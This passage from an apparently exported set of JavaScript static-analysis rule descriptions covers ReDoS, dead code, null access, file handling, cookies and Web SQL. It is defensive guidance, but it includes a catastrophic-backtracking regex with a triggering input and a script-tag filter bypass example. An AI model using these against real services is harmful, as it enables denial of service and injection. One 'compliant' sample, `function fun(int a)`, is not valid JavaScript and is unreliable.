regex.test(str);
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4784,js,JavaScript,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
const regex = /(a+)+/; // RegExp object from regex literal
const regex = new RegExp(regex); // RegExp object from string

// All the following method calls are questionable. Validate the regular expression and matched string.
str.search(regex);
str.match(regex);
str.split(regex);
str.replace(regex);
regex.exec(str);
regex.test(str);
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2013-06-19T07:34:52+0200,"<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) and <code>throw</code> expressions move control flow out of the
current code block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun(a) {
  var i = 10;
  return i + a;
  i++;             // Noncompliant; this is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun(int a) {
  var i = 10;
  return i + a;
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores unreachable <code>break</code> statements in <code>switch</code> clauses.</p>
<pre>
switch (x) {
  case 42:
     return 43;
     break;   // Compliant
  default:
    doSomething();
}
</pre>
<p>Hoisted variables declarations without initialization are always considered reachable.</p>
<pre>
function bar() {
  return x = function() {
    x.foo = 42;
  }
  var x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",javascript:UnreachableCode,js,JavaScript,"<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) and <code>throw</code> expressions move control flow out of the
current code block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun(a) {
  var i = 10;
  return i + a;
  i++;             // Noncompliant; this is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun(int a) {
  var i = 10;
  return i + a;
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores unreachable <code>break</code> statements in <code>switch</code> clauses.</p>
<pre>
switch (x) {
  case 42:
     return 43;
     break;   // Compliant
  default:
    doSomething();
}
</pre>
<p>Hoisted variables declarations without initialization are always considered reachable.</p>
<pre>
function bar() {
  return x = function() {
    x.foo = 42;
  }
  var x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Jump statements should not be followed by dead code,[],MAJOR,"['cert', 'cwe', 'misra', 'unused']",BUG
2016-05-19T18:11:27+0200,"<p>When a variable is assigned an <code>undefined</code> or <code>null</code> value, it has no properties. Trying to access properties of such a
variable anyway results in a <code>TypeError</code>, causing abrupt termination of the script if the error is not caught in a <code>catch</code>
block. But instead of <code>catch</code>-ing this condition, it is best to avoid it altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x === undefined) {
  console.log(x.length); // Noncompliant; TypeError will be thrown
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/476.html"">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PAw"">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwDOAQ"">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>",javascript:S2259,js,JavaScript,"<p>When a variable is assigned an <code>undefined</code> or <code>null</code> value, it has no properties. Trying to access properties of such a
variable anyway results in a <code>TypeError</code>, causing abrupt termination of the script if the error is not caught in a <code>catch</code>
block. But instead of <code>catch</code>-ing this condition, it is best to avoid it altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x === undefined) {
  console.log(x.length); // Noncompliant; TypeError will be thrown
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/476.html"">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PAw"">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwDOAQ"">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>","Properties of variables with ""null"" or ""undefined"" values should not be accessed",[],MAJOR,"['cert', 'cwe']",BUG
2019-03-04T09:37:21+0100,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
const fs = require('fs'); // review how the 'fs' module is used
// All 'fs' operations accepting a path as a parameter are security-sensitive and should be reviewed
// Examples:
var res = fs.readdirSync(path); // Questionable
var fd = fs.openSync(path, 'r'); // Questionable
var ws = fs.createWriteStream(path); // Questionable
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the path is fully hard-coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4797,js,JavaScript,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
const fs = require('fs'); // review how the 'fs' module is used
// All 'fs' operations accepting a path as a parameter are security-sensitive and should be reviewed
// Examples:
var res = fs.readdirSync(path); // Questionable
var fd = fs.openSync(path, 'r'); // Questionable
var ws = fs.createWriteStream(path); // Questionable
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the path is fully hard-coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Handling files is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2019-03-04T09:37:21+0100,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
const https = require('https');

http.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Questionable
});
https.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Questionable
});
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();
app.use(function(req, res, next) {
  res.cookie('name', 'John'); // Questionable
});
</pre>
<pre>
// === In browser ===
// Set cookie
document.cookie = ""name=John""; // Questionable

// Read cookie
var x = document.cookie; // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",javascript:S2255,js,JavaScript,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
const https = require('https');

http.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Questionable
});
https.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Questionable
});
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();
app.use(function(req, res, next) {
  res.cookie('name', 'John'); // Questionable
});
</pre>
<pre>
// === In browser ===
// Set cookie
document.cookie = ""name=John""; // Questionable

// Read cookie
var x = document.cookie; // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",Using cookies is security-sensitive,[],MINOR,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2015-07-09T16:59:47+0200,"<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var db = window.openDatabase(""myDb"", ""1.0"", ""Personal secrets stored here"", 2*1024*1024);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
</ul>",javascript:S2817,js,JavaScript,"<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var db = window.openDatabase(""myDb"", ""1.0"", ""Personal secrets stored here"", 2*1024*1024);  // Noncompliant
